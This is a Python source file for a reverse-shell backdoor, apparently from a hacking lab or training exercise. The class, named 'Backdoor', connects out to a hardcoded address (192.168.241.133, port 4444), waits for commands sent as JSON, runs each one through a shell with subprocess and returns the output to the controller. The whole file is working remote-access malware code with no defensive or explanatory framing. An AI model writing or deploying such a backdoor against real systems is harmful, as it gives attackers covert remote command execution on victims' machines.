import subprocess, sys, socket, json


class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            self.connection.connect((str(ip),port))
        except ConnectionRefusedError:
            sys.exit()
        
    
    def executeCmd(self,cmd):
        cmd = subprocess.check_output(cmd,shell=True)
        return cmd
    
    
    def sendStream(self,data):
        jsData = json.dumps(data)
        self.connection.send(str(jsData).encode('utf-8'))


    def recvStream(self):
        jsData = ''
        while True:
            try:
                recvData = self.connection.recv(1024)
                recvData = recvData.decode()
                jsData = jsData + recvData
                return json.loads(jsData)
            except Exception as e:
                continue


    def run(self):
        while True:
            print('run1')
            cmdIn = self.recvStream()
            print(cmdIn)
            print('run1')
            #cmdIn = cmdIn.decode()
            #print(cmdIn)
            try:
                print('run3_TRY')
                cmdOut = self.executeCmd(cmdIn)
                print('run4_TRY')
                print(cmdOut)
                cmdOut = cmdOut.decode('utf-8')
                print(cmdOut)
                self.sendStream(cmdOut)
                print('run5_TRYPOSTSEND')
            except subprocess.CalledProcessError:
                self.sendStream('Subprocess Error, shell command not accepted by target')





try:
    backdoor = Backdoor('192.168.241.133',4444)
    backdoor.run()
except KeyboardInterrupt:
    sys.exit()
except ConnectionAbortedError:
    sys.exit()
except ConnectionResetError:
    sys.exit()
except ConnectionRefusedError:
    sys.exit()

